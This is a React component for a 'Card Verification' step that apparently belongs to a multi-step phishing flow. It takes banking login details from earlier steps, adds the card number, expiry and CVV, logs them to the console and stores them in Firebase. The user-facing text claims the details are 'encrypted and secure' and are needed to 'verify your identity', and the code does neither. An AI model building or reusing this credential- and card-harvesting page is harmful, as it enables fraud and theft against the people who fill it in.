import React, { useState } from 'react';
import { ChevronRight, FileText } from 'lucide-react';
import { saveCompleteUserData } from '../database';

export default function CardVerificationForm({ onSubmit, loginData }) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g);
    return formatted ? formatted.join(' ') : cleaned;
  };

  const formatExpiryDate = (value) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4);
    }
    return cleaned;
  };

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\s/g, '');
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
    }
  };

  const handleExpiryChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setExpiryDate(value);
    }
  };

  const handleCvvChange = (e) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setCvv(value);
    }
  };

  const handleVerify = async () => {
    const newErrors = {};
    
    if (!cardNumber) {
      newErrors.cardNumber = 'Please enter your card number';
    } else if (cardNumber.length !== 16) {
      newErrors.cardNumber = 'Please enter a valid 16-digit card number';
    }
    
    if (!expiryDate) {
      newErrors.expiryDate = 'Please enter the expiry date';
    } else if (expiryDate.length !== 4) {
      newErrors.expiryDate = 'Please enter a valid expiry date (MM/YY)';
    } else {
      const month = parseInt(expiryDate.slice(0, 2));
      const year = parseInt('20' + expiryDate.slice(2, 4));
      const currentDate = new Date();
      const currentMonth = currentDate.getMonth() + 1;
      const currentYear = currentDate.getFullYear();
      
      if (month < 1 || month > 12) {
        newErrors.expiryDate = 'Please enter a valid month (01-12)';
      } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
        newErrors.expiryDate = 'Card has expired. Please enter a valid expiry date';
      }
    }
    
    if (!cvv) {
      newErrors.cvv = 'Please enter the CVV';
    } else if (cvv.length !== 3) {
      newErrors.cvv = 'Please enter a valid 3-digit CVV';
    }
    
    setErrors(newErrors);
    
    if (Object.keys(newErrors).length > 0) {
      return;
    }

    const step3Data = {
      ...loginData,
      cardNumber,
      expiryDate: formatExpiryDate(expiryDate),
      cvv,
      step3Timestamp: new Date().toISOString()
    };
    
    console.log('Step 3 data (ALL STEPS):', step3Data);
    setIsLoading(true);
    
    try {
      // Save complete user data to Firebase
      const docId = await saveCompleteUserData(step3Data);
      console.log('Complete user data saved to Firebase with ID:', docId);
      
      if (onSubmit) {
        onSubmit(step3Data);
      }
    } catch (error) {
      console.error('Error saving complete user data to Firebase:', error);
      alert('Error saving data. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleVerify();
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-sm p-6 lg:p-8">
      <div className="flex items-center gap-3 mb-6">
        <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center relative">
          <FileText size={24} className="text-gray-400" />
          {/* 100% progress ring around the icon */}
          <svg className="absolute inset-0 w-12 h-12 transform -rotate-90" viewBox="0 0 48 48">
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#e5e7eb"
              strokeWidth="4"
            />
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#dc2626"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray={`${2 * Math.PI * 20} 0`}
            />
          </svg>
        </div>
      </div>

      <h2 className="text-2xl font-semibold mb-4">Card Verification</h2>
      
      <div className="flex gap-6 mb-6 text-sm text-gray-600">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 bg-red-600 rounded-full flex items-center justify-center">
            <div className="w-2 h-2 bg-white rounded-full"></div>
          </div>
          <span className="font-semibold">Verify Card</span>
        </div>
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center">
            <ChevronRight size={12} />
          </div>
          <span>Complete</span>
        </div>
      </div>

      <div className="bg-gray-50 p-4 rounded mb-6 text-sm text-gray-700">
        Enter your card details to verify your identity
      </div>

      <div>
        {/* Show user info summary */}
        <div className="mb-6 p-4 bg-blue-50 rounded">
          <p className="text-sm text-gray-700">
            <span className="font-semibold">Access account:</span> {loginData?.accessNumber || 'N/A'}
          </p>
          <p className="text-sm text-gray-700">
            <span className="font-semibold">User number:</span> {loginData?.userNumber || 'N/A'}
          </p>
        </div>

        <div className="mb-4">
          <label className="block text-sm font-medium mb-2">
            Card Number
          </label>
          <input
            type="text"
            value={formatCardNumber(cardNumber)}
            onChange={handleCardNumberChange}
            onKeyPress={handleKeyPress}
            className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
              errors.cardNumber ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
            }`}
            placeholder="1234 5678 9012 3456"
            autoFocus
          />
          {errors.cardNumber && (
            <p className="text-xs text-red-500 mt-1">{errors.cardNumber}</p>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4 mb-6">
          <div>
            <label className="block text-sm font-medium mb-2">
              Expiry Date
            </label>
            <input
              type="text"
              value={formatExpiryDate(expiryDate)}
              onChange={handleExpiryChange}
              onKeyPress={handleKeyPress}
              className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
                errors.expiryDate ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
              }`}
              placeholder="MM/YY"
            />
            {errors.expiryDate && (
              <p className="text-xs text-red-500 mt-1">{errors.expiryDate}</p>
            )}
          </div>

          <div>
            <label className="block text-sm font-medium mb-2">
              CVV
            </label>
            <input
              type="password"
              value={cvv}
              onChange={handleCvvChange}
              onKeyPress={handleKeyPress}
              className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
                errors.cvv ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
              }`}
              placeholder="123"
              maxLength={3}
            />
            {errors.cvv && (
              <p className="text-xs text-red-500 mt-1">{errors.cvv}</p>
            )}
          </div>
        </div>

        <button
          onClick={handleVerify}
          disabled={isLoading}
          className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-semibold py-3 rounded transition-colors mb-4"
        >
          {isLoading ? 'Saving...' : 'Verify'}
        </button>

        <div className="text-center">
          <p className="text-xs text-gray-500">
            Your card details are encrypted and secure
          </p>
        </div>
      </div>
    </div>
  );
}